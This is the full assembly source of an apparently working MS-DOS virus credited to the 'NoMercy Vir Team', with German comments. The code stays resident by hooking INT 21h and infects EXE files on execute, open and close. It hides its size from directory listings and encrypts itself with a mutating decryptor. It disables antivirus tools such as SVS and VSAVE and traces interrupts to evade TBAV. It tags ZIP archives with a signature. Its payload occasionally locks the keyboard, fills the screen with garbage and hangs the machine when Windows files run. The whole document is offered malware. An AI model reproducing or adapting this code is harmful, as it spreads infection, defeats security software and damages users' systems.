.model tiny
.code
.startup
.286


anfang:
                nop
                sti
                std
                jmp enc_Dec                    ;Entschluesselung
                cli
                cld
		db	'PkZip',00
code:
                push ds es
                
                call fuckav                     ;Av-Progs in den Arsch treten
                call trace_rout                 ;21er tracen

                mov ah,30h
                mov di,1234h
                int 21h
rutherereturn:
                cmp di,1233h
                jne install
                jmp yethere


install:
                mov byte ptr cs:[in_use+bp],0              ;in use flag aus
                mov byte ptr cs:[stealth+bp],1             ;stealth auf an
                mov byte ptr cs:[key+bp],0                 ;memkey auf 0

                push 0
                pop ds
                mov si,84h
                lds dx,[si]

                mov word ptr cs:[oldofs+bp],dx             ;original 21er saven
                mov word ptr cs:[oldseg+bp],ds

                pop  ds
                push ds
                pop es
                push ds


                mov ax,ds
                cmp ax,0a000h
                jb nothigh
                jmp yethere

nothigh:
                mov ax,5802h                    ;umbs abfragen
                int 21h
                push ax                         ;sichern


                mov ax,5803h                    ;umbs beteiligen
                mov bx,1
                int 21h

                mov ax,5800h                    ;strategie holen
                int 21h
                push ax                         ;sichern

                mov ax,5801h                    ;strategie setzen
                mov bx,0042h                    ;hoch/letzter
                int 21h

                mov ah,48h
                mov bx,((ende-anfang) / 16) + (80h  / 16)     ;viriisize
                int 21h
                jc errorumb
                dec ax
                mov ds,ax
                mov word ptr ds:[1],8          ;als dos markieren
                inc ax
                jmp umb

errorumb:

                dec ax
                mov ds,ax
                sub word ptr ds:[3],((ende-anfang) / 16) + (80h  / 16) ;MCB kleiner
                add ax,word ptr ds:[3]
                mov es:[2],ax
                inc ax

umb:

                sub ax,10h                            ;wegen offset 100h
                mov es,ax
                mov di,100h
                push cs
                pop ds
                mov si,100h
                add si,bp
                mov cx,(ende-anfang)
                cli
                cld
                rep movsb                        ;virii hochkopieren
                mov si,offset int24
                add si,bp
                mov cx,offset ende_main_enc_dec-int24
                rep movsb

                pop ax
                mov bl,al
                xor bh,bh
                mov ax,5801h
                int 21h                         ;alte strat wiede her

                pop ax
                mov bl,al
                xor bh,bh
                mov ax,5803h
                int 21h



                mov si,84h
                push 0
                pop ds
                mov word ptr [si],offset int_21        ;neuen 21er setzen
                mov word ptr [si+2],es

                sti


yethere:
                pop es
                pop ds
                mov ax,ds
                add ax,word ptr cs:[header+0eh+bp]   ;ss
                add ax,10h
                mov ss,ax
                mov sp,word ptr cs:[header+10h+bp]   ;sp
                mov ax,ds
                add ax,word ptr cs:[header+16h+bp]   ;original segment
                add ax,10h
                push ax
                push word ptr cs:[header+14h+bp]   ;offset
                xor ax,ax                          ;register auf 0
                xor bx,bx
                xor cx,cx
                cwd
                xor si,si
                xor di,di
                xor bp,bp
farret:
                retf                                 ;zum origprog
int_21:

                cmp byte ptr cs:[in_use],0
                je action
                jmp rause2
action:
                call dec_mem
memmark:
                cmp ah,30h                       ;selfcheck
                jne askfilehandling
                cmp di,1234h
                jne askfilehandling
                push ds
                pusha
                mov di,sp
                add di,12h
                mov ds,word ptr ss:[di+2]
                mov di,word ptr ss:[di]
                add di,offset farret-rutherereturn
                cmp byte ptr ds:[di],0cbh
                jne saynothing

                popa
                dec di                           ;schon da, dann di - 1
                mov byte ptr cs:[key],0          ;key auf 0
                pop ds
                iret
saynothing:
                popa
                pop ds
                jmp rause

askfilehandling:                                 ;datei ausfuehren?
                mov byte ptr cs:[in_use],1
                cmp ax,4b00h
                jne oeffnen
                jmp exec
oeffnen:
                cmp ah,3dh
                jne askclose
                jmp open
askclose:
                cmp ah,3eh
                jne askf
                jmp close

askf:
                cmp ax,2521h
                je set21
                cmp ah,4ch
                jne askfcbfn
                cmp byte ptr cs:[stealth],0
                je avprogexit
askfcbfn:
                cmp ah,11h
                je fcbfn
                cmp ah,12h
                je fcbfn
                cmp ah,4eh
                jne askfindfn1
                jmp findfn
askfindfn1:
                cmp ah,4fh
                jne nix
                jmp findfn
nix:
                jmp rause

avprogexit:
                push ax
                mov ah,0eh
                mov al,'!'
                int 10h
                pop ax
                mov byte ptr cs:[stealth],1
                jmp rause


fcbfn:
                pushf
                call dword ptr cs:[oldofs]
                pusha
                pushf
                push es
                push ds
                mov ah,2fh
                int 21h

                mov ax,word ptr es:[bx+30]
                and ax,1fh
                or ax,ax
                jne nofcbfnaction
                cmp word ptr es:[bx+36],2222
                jb nofcbfnaction
                cmp word ptr es:[bx+38],0
                jne nofcbfnaction
                sub word ptr es:[bx+36],ende-anfang


nofcbfnaction:
                pop ds
                pop es
                popf
                popa
                mov byte ptr cs:[key],0
                mov byte ptr cs:[in_use],0

                retf 2

set21:
                push es
                push si
                push di
                mov si,207h
                push cs
                pop es
                mov di,offset svscode
                mov cx,5
                rep cmpsb
                jne noressvs
                mov ah,35h
noressvs:
                mov si,dx
                mov di,offset nemcode
                mov cx,5
                rep cmpsb
                jne noresnem
                mov ah,35h
noresnem:

                pop di
                pop si
                pop es
                jmp rause

findfn:
                pushf
                call dword ptr cs:[oldofs]

                pusha                                 ;register saven
                pushf
                push es


                mov ah,2fh                            ;dta ermitteln
                call ende+(call21-int24)

                cmp byte ptr cs:[stealth],0           ;soll ich stealthen?
                je nofnaction

                mov ax,word ptr es:[bx+22]            ;Uhrzeit des Files
                and ax,1fh
                or ax,ax                              ;sekunden=0?
                jne nofnaction
oksekunden:
                cmp word ptr es:[bx+28],0            
                jne nofnaction
                cmp word ptr es:[bx+26],2222          ;lo-word filesize
                jb nofnaction
                sub word ptr es:[bx+26],(ende-anfang) ;viriisize abziehen

nofnaction:
                pop es                                ;Register wieder her
                popf
                popa

                mov byte ptr cs:[in_use],2            ;in_use auf false
               mov byte ptr cs:[key],2
                retf 2                                 ;servus
close:
                push es
                pusha
                push ds

                push ax
                push di
                push bx
                cmp bx,5
                jb handleerror

                mov ax,1220h
                int 2fh                                 ;tablenumber abfragen
                jnc handleok
handleerror:
                pop bx di ax ds
                
                popa
                pop es
                jmp rause

handleok:
                mov bl,byte ptr es:[di]
                xor bh,bh

                mov ax,1216h
                int 2fh                                 ;einsprung der table
                mov word ptr es:[di+2],02               ;schreib modus
                mov al,byte ptr es:[di+4]
                xor ah,ah
                mov word ptr cs:[attrib],ax             ;Attribut sichern
                mov byte ptr es:[di+4],0                ;Attribute wech
                mov word ptr cs:[fstes],es              ;es:di sichern
                mov word ptr cs:[fstdi],di

                pop bx di ax
                

                jmp routine
open:
exec:
                push es
                pusha
                push ds

routine:
                mov byte ptr cs:[funktion],ah
                call set24er

                cmp byte ptr cs:[stealth],0
                jne machweiter
                jmp errorinfect_b


machweiter:
                cmp byte ptr cs:[funktion],3eh
                je afteropen
                mov ax,4300h
                call ende+(call21-int24)
                ;int 21h
                jnc attrok
                jmp errorinfect_b
attrok:
                mov word ptr cs:[attrib],cx      ;attribute saven
                mov ax,4301h
                xor cx,cx
                ;int 21h                          ;attribute weg
                call ende+(call21-int24)
                jnc noattrok
                jmp errorinfect_b
noattrok:
                mov ax,3d02h                     ;Datei oeffnen
                ;int 21h
                call ende+(call21-int24)
                jnc openok
                jmp errorinfect_b

openok:
                xchg ax,bx                       ;handle in bx

afteropen:
                

                call nameesdi                    ;Filename in ds:Di

                cmp byte ptr cs:[funktion],3eh
                jne nozip
                cmp word ptr [di+8],'IZ'        ;.ZIP?
                jne nozip

                mov ax,4202h                     ;ans Ende seeken
                xor cx,cx
                cwd
                call ende+(call21-int24)
                xchg dx,cx                      ;werte vertauschen
                xchg ax,dx
                sub dx,18
                mov ax,4200h
                call ende+(call21-int24)                     ;ende-18 hinseeken
                mov ah,3fh
                push cs
                pop ds
                mov dx,offset header
                mov cx,2
                call ende+(call21-int24)                     ;Falls messi schon da
                cmp word ptr [header],'sh'
                je nomessi
                mov ax,4202h
                xor cx,cx
                cwd
                call ende+(call21-int24)                     ;ans ende hin


                mov ah,40h
                
                mov cx,18                        ;laenge
                mov dx,offset messi
                call ende+(call21-int24)                      ;messi reinschreiben
nomessi:
                jmp filenameok
nozip:



                cmp word ptr [di],'OC'           ;COmannd.com?
                je shitname
                cmp word ptr [di+2],'CM'         ;meMChk von Suspicion
                je shitname
                cmp word ptr [di+2],'IM'         ;DPMI
                je shitname
                cmp word ptr [di],'BT'           ;TBav?
                je avprog
                cmp word ptr [di],'-F'           ;F- Prot
                je avprog
		cmp word ptr [di],'VA'
		je avprog
	        cmp word ptr [di],'IW'           ;WIn*.*
                je windows
                cmp word ptr [di+3],'BP'         ;suspbait viren kîder
                jne filenameok

shitname:
                jmp errorinfect
avprog:
                cmp byte ptr cs:[funktion],4bh
                jne shitname
                mov byte ptr cs:[stealth],0          ;bei avprog nicht stealthen
                jmp errorinfect

windows:
                in al,40h                          ;zufallszahl
                xor dx,dx
                mov cx,222                          ;verhÑltnis 1:20
                div cx
                or dx,dx
                jne filenameok
                in al,21h                          ;keyboard aus
                or al,02
                out 21h,al
                mov ax,0b800h
                mov es,ax
                mov ax,400h
                mov ds,ax
                push 0
                pop di
                push 0
                pop si
                mov cx,4000
                rep movsb                          ;bildschirm vollmÅllen

                jmp $                              ;und tschuessss....


filenameok:

                push cs                          ;ds=cs
                pop ds

                mov ax,4200h                     ;zum anfang seeken
                xor cx,cx
                cwd
                ;int 21h
                call ende+(call21-int24)



                mov ah,3fh
                mov cx,18h
                mov dx,offset header
                ;int 21h
                call ende+(call21-int24)
                cmp ax,cx
                je readok
                jmp errorinfect
readok:
                cmp word ptr ds:[header],'MZ'
                je exefile
                cmp word ptr ds:[header],'ZM'
                je exefile
                jmp errorinfect

exefile:
                mov ax,4202h
                xor cx,cx
                cwd
                ;int 21h
                call ende+(call21-int24)
                or dx,dx                                ;< 64K ?
                jne wrongsize
                cmp ax,2222
                jnb sizeok

wrongsize:
                jmp errorinfect

sizeok:
                push ax

                mov ax,5700h                     ;Date/Time saven
                ;int 21h
                call ende+(call21-int24)
                mov word ptr ds:[time],cx
                mov word ptr ds:[date],dx

                and cx,1fh
                or cx,cx
                jne askopen

                                                     ;sichergehen ob wirklich
                                                     ;infiziert ist
                mov ax,word ptr ds:[header+16h]      ;cs
                add ax,word ptr ds:[header+08h]      ;header in paragraphen
                shl ax,4                             ;mal 16
                add ax,word ptr ds:[header+14h]      ;ip dazu
                                                     ;entrypoint
                pop cx                               ;filesize
                push cx
                sub cx,ax                            ;filesize - ep

                cmp cx,ende-anfang                   ;= virii size?
                jne askopen                          ;nein dann weitermachen
                cmp byte ptr ds:[funktion],3dh       ;sind wir bei datei oeffnen?
                jne noopen                           ;no dann abgang
                pop cx                               ;scheisse runterholen
                push ax
                jmp cleanfile                        ;virii rausbauen
noopen:
                pop cx
                jmp errorinfect

askopen:
                cmp byte ptr ds:[funktion],3dh   ;sind wir bei datei oeffnen?
                je noopen

infect:
                call ende+3                             ;code encrypten
                cmp byte ptr cs:[error],0
                je klor
                pop ax
                jmp errorinfect

klor:
                mov ax,4200h                            ;zum anfang seeken
                xor cx,cx
                cwd
                ;int 21h
                call ende+(call21-int24)

                pop ax                                  ;filesize
                push ax
                mov cx,16
                xor dx,dx
                div cx
                sub ax,word ptr ds:[header+8]
                mov word ptr ds:[header+16h],ax         ;cs
                mov word ptr ds:[header+14h],dx         ;ip
                add ax,(ende-anfang) / 16
                mov word ptr ds:[header+0eh],ax         ;ss
                mov word ptr ds:[header+10h],150h       ;sp

                pop ax
                add ax,ende-anfang                      ;zu filesize vrii dazu
                mov cx,200h
                xor dx,dx
                div cx                                  ;durch 512 teilen
                inc ax
                mov word ptr ds:[header+4],ax           ;memory field richten
                mov word ptr ds:[header+2],dx

                mov ah,40h
                mov cx,18h
                mov dx,offset header
                ;int 21h                                 ;neuen header schreiben
                call ende+(call21-int24)

                jmp restore

nomark:
                mov ax,5701h                            ;Date/Time restore
                mov cx,word ptr ds:[time]
                mov dx,word ptr ds:[date]
                ;int 21h
                call ende+(call21-int24)
                jmp errorinfect
restore:
                mov ax,5701h                            ;Date/Time restore
                mov cx,word ptr ds:[time]
                mov dx,word ptr ds:[date]
                shr cx,5                                ;sekunden auf 0
                shl cx,5
                ;int 21h
                call ende+(call21-int24)


errorinfect:
                cmp byte ptr cs:[funktion],3eh
                je noclose
                mov ah,3eh                              ;Datei schliessen
                ;int 21h
                call ende+(call21-int24)
errorinfect_b:
noclose:

                pop ds
                popa
                push ds
                pusha
                cmp ah,3eh
                je norestattr

                mov ax,4301h                            ;Attribute wieder her
                mov cx,word ptr cs:[attrib]
                ;int 21h
                call ende+(call21-int24)
                jmp weiter
norestattr:
                mov es,word ptr cs:[fstes]              ;es:di von file system
                mov di,word ptr cs:[fstdi]              ;table

                mov ax,word ptr cs:[attrib]
                mov byte ptr es:[di+4],al               ;altes attribut her


weiter:
                call rest24er                           ;kritiker restoren
                popa
                pop ds
                pop es
                


                jmp rause


set24er:
                push ds
                push dx
                xor ax,ax
                mov ds,ax
                cli
                mov si,90h
                lds dx,[si]
                mov word ptr cs:[old24ofs],dx
                mov word ptr cs:[old24seg],ds

                mov ds,ax
                mov word ptr ds:[si],offset ende
                mov word ptr ds:[si+2],cs
                sti
                pop dx
                pop ds
                ret

rest24er:
                mov dx, word ptr cs:[old24ofs]
                mov cx, word ptr cs:[old24seg]
                xor ax,ax
                mov ds,ax
                cli
                mov word ptr ds:[90h],dx
                mov word ptr ds:[92h],cx
                sti
                ret


nameesdi:
                push bx
                push es
                mov ax,1220h
                int 2fh                              ;table number des files
                mov bl,byte ptr es:[di]              ;in bx die nummer
                xor bh,bh
                mov ax,1216h
                int 2fh                              ;einsprung der table holen
                add di,32d                           ;pointer zum filename
                mov bx,es
                mov ds,bx                            ;ds:di = filename
                pop es
                pop bx
                ret

cleanfile:
                mov dx,ax                            ;ax nach low word
                add dx,date-anfang
                xor cx,cx                            ;hi word auf 0
                mov ax,4200h
                ;int 21h                              ;an date/time seeken
                call ende+(call21-int24)
                push ax                              ;pointer sichern

                mov ah,3fh
                mov cx,4                             ;4 bytes
                mov dx,offset date                   ;an date/time
                ;int 21h
                call ende+(call21-int24)


                mov ah,3fh
                mov cx,18h
                mov dx,offset header
                ;int 21h                              ;header einlesen
                call ende+(call21-int24)
                pop ax                               ;pointer runter

                add ax,mainkey+1-date                  ;zum key hin
                mov dx,ax
                xor cx,cx
                mov ax,4200h
                ;int 21h
                call ende+(call21-int24)

                mov ah,3fh
                mov cx,1h
                mov dx,offset headerkey
                ;int 21h                              ;key einlesen
                call ende+(call21-int24)


                mov ah,byte ptr ds:[headerkey]       ;key setzen
                mov di,offset date
dec_header:
                xor byte ptr ds:[di],ah              ;header entschluesseln
                inc di
                cmp di,offset date+18h+4h          ;header+date/time
                jne dec_header

                mov ax,4200h
                xor cx,cx
                cwd
                ;int 21h                               ;zum anfang seeken
                call ende+(call21-int24)

                mov ah,40h
                mov dx,offset header
                mov cx,18h
                ;int 21h                               ;org header schreiben
                call ende+(call21-int24)

                mov ax,4200h
                xor cx,cx
                pop dx                                ;ep
                ;int 21h
                call ende+(call21-int24)

                mov ah,40h
                xor cx,cx
                ;int 21h                                ;datei abschneiden
                call ende+(call21-int24)

                jmp nomark                             ;datei schliessen


dec_mem:
                push di
                push ax

                push 1234
                pop  ax
                mov di,sp
                cmp word ptr ss:[di-2],ax               ;Tracing?
                je notrace
                pop ax
                pop di
                add sp,2
                jmp rause2                               ;Ja dann servus


notrace:

                mov di,offset memmark
                mov ah,byte ptr cs:[key]

decrypt:
                xor byte ptr cs:[di],ah
                inc di
                cmp di,offset dec_mem
                jne decrypt
                pop ax
                pop di

                ret


enc_mem:
                push di
                push ax

                mov di,offset memmark
getkey:
                in al,40h
                or al,al
                je getkey
                mov byte ptr cs:[key],al

encrypt:
                xor byte ptr cs:[di],al
                inc di
                cmp di,offset dec_mem
                jne encrypt
                pop ax
                pop di

                ret


                in_use          db 0


rause:
                mov byte ptr cs:[in_use],0
                call enc_mem
rause2:
                farjump         db 0eah
                oldofs          dw 0
                oldseg          dw 0

                old24ofs        dw 0
                old24seg        dw 0
                attrib          dw 0
                funktion        db 0
                key             dw 0
                headerkey       db 0
                fstdi           dw 0
                fstes           dw 0
                error           db 0
                stealth         db 0

                date            dw 0
                time            dw 0
                header          db 14h dup (0)
                                db 00,00                ;offset fÅr gen one
                                dw -10h                 ;segment(psp int 20h)
                
	messi	db	'LUCKY from Germany was Here....Greets: NoMercy Vir Team',0
fuckav:
                mov ax,3521h                            ;Fuck SVS
                int 21h
                cmp bx,3
                jne nosvs
                mov di,207h
                push cs
                pop ds
                mov si,offset svscode
                add si,bp
                mov cx,5
                rep cmpsb
                jne nosvs
                mov byte ptr es:[218h],0cfh             ;iret
                mov word ptr es:[2983h],9090h           ;crc ausnoppen
                mov word ptr es:[2989h],9090h
                mov ah,30h                              ;svs deinstallation
                mov si,534bh
                mov di,1994h
                int 21h

nosvs:
                mov ax,30h                        ;Fuck VSAVE
                add ax,0fa01h-30h
                mov dx,5945h
                int 21h

                ret

                svscode   db 0b8h,00,4ch,0cdh,21h
                nemcode   db 9ch,0fch,90h,0fbh,0eh


int24:                                                ;critical errorhandler
                mov al,3
                iret

main_enc_dec:
                mov byte ptr cs:[error],0
                cli
                xor ax,ax
                mov ds,ax
                mov si,84h
                lds dx,[si]
                push dx
                push ds
                mov ds,ax
                mov cx,word ptr cs:[oldofs]
                mov dx,word ptr cs:[oldseg]
                
                mov word ptr ds:[84h],cx                     ;21er auf alte
                mov word ptr ds:[86h],dx                     ;Adresse

                push cs
                pop ds
                in al,40h
                mov byte ptr ds:[mainkey+1],al          ;neuen key machen
                xor bp,bp

                call word ptr ds:[mutateaddr]           ;code encrypten
                mov ah,40h                              ;virii hinten hin
                mov cx,ende-anfang                      ;virii size
                mov dx,100h
                call word ptr ds:[org21]
                jnc okcodewrite
                mov byte ptr ds:[error],1
okcodewrite:
                call word ptr ds:[encaddr]              ;code wieder decrypten
                mov ax,0e07h
                int 10h


                pop dx
                pop cx
                xor ax,ax
                mov ds,ax
                mov word ptr ds:[84h],cx                ;21er wieder auf mich
                mov word ptr ds:[86h],dx
                push cs
                pop ds

                sti
                ret

call21:
                pushf

                afcall db 9ah
                newofs dw 0
                newseg dw 0
                ret


ende_main_enc_dec:

trace_rout proc near

        mov ax,offset newseg
        add ax,bp
        mov word ptr cs:[neuseg+2],ax
        mov ax,offset newofs
        add ax,bp
        mov word ptr cs:[neuofs+2],ax


        push 0
        pop ds
        mov si,4
        push ds
        lds dx,[si]
        mov word ptr cs:[old1ofs+bp],dx
        mov word ptr cs:[old1seg+bp],ds
        pop ds
        cli
        mov ax,offset int_1
        add ax,bp
        mov word ptr ds:[si],ax
        mov word ptr ds:[si+2],cs
        sti

        pushf
        pop ax
        or ah,01
        push ax
        popf
        mov si,84h
        push 0
        pop ds
        mov ah,30h
        pushf
        call dword ptr ds:[si]
        pushf
        pop ax
        and ah,0feh
        push ax
        popf
        push 0
        pop ds
        mov ax,word ptr cs:[old1ofs+bp]
        mov bx,word ptr cs:[old1seg+bp]
        cli
        mov word ptr ds:[4h],ax
        mov word ptr ds:[6h],bx
        sti
        push es
        pop  ds
        ret

int_1:
        push di bx ax bp ds
        
        mov di,sp
        add di,10
        mov ds,word ptr ss:[di+2]
        mov ax,cs
        mov bp,ds
        cmp ax,bp
        je selber

        mov bp,word ptr ss:[di]

        cmp byte ptr ds:[bp-1],9ch
        jne nopopf
        mov ax,word ptr ss:[di+6]
        and ah,0feh
        mov word ptr ss:[di+6],ax
nopopf:

       cmp byte ptr ds:[bp],9dh
       jne nopushf
       mov ax,word ptr ss:[di+6]
       or ah,01
       mov word ptr ss:[di+6],ax

nopushf:


        cmp word ptr ds:[bp],05ebh              ;nearjump
        jne notbav
        cmp byte ptr ds:[bp+2],0eah             ;farjump
        jne notbav
        mov word ptr ds:[bp],9090h

notbav:
        cmp word ptr ds:[bp],6855h              ;push 1234
        jne nosusp
        cmp byte ptr ds:[bp+2],34h
        jne nosusp
        cmp byte ptr ds:[bp+14],74h             ;jne
        jne nosusp
        add word ptr ss:[di],4dh                ;traceroutine Åberspringen

nosusp:
        cmp word ptr ss:[di+2],100h
        ja selber
        cmp word ptr cs:[newseg],0
        jne selber


        mov ax,word ptr ss:[di+2]
neuseg:
        mov word ptr cs:[0000],ax
        mov ax,word ptr ss:[di]
neuofs:
        mov word ptr cs:[0000],ax

selber:
        pop ds
        pop bp
        pop ax
        pop bx
        pop di
        iret

        old1ofs dw 0
        old1seg dw 0
        pf     db 0

trace_rout endp

mutate:
                push es
                push cs
                pop es

                mov di,100h
mut:
                mov cx,1000h
dummy:          loop dummy               ;etwas warten
                in al,40h                ;zufallszahl
                or al,al
                je mut                   ;falls 0
                xor ah,ah
                xor dx,dx
                mov si,5
                div si                   ;durch 5 teilen
                cmp dl,2                 ;wenn 2 dann nop
                jne nonop
                mov dl,96h
nonop:
                mov al,0fah              ;zu 0fah denn rest dazu
                add al,dl
                stosb                    ;hinschreiben
                cmp di,108h              ;bis 108h
                jne mut

                in al,40h                ;zufallszahl fÅr jumpposition
                xor ah,ah
                xor dx,dx
                mov cx,6                 ;zwischen 0 und 5 + 100h
                div cx

                mov di,100h
                add di,dx
                mov cx,offset (enc_dec-anfang)-3      ;jump berechnen
                sub cx,dx
                xchg ax,cx
                push ax
                mov al,0e9h
                stosb                   ;0e9 vom jump
                pop ax
                stosw                   ;wohin


                pop es

                jmp mainkey

enc_dec:
                int 08h
return:
                mov di,sp
                mov bp,word ptr ss:[di-6]
                sub bp,offset return
mainkey:
                mov ah,0
                mov cx,(enc_dec-anfang)-10
                cld
                cli
loop1:
                mov si,cx
                xor byte ptr cs:[bp+code-1+si],ah
                loop loop1
                sti
                or bx,bx
                jne backto21

                mov ax,offset code
                push ax
                pop di
                mov di,sp
                mov ax,word ptr ss:[di-2]
                add ax,bp
                jmp ax
backto21:
                ret
                encaddr    dw offset mainkey
                mutateaddr dw offset mutate
                org21      dw ende+(call21-int24)



ende:
end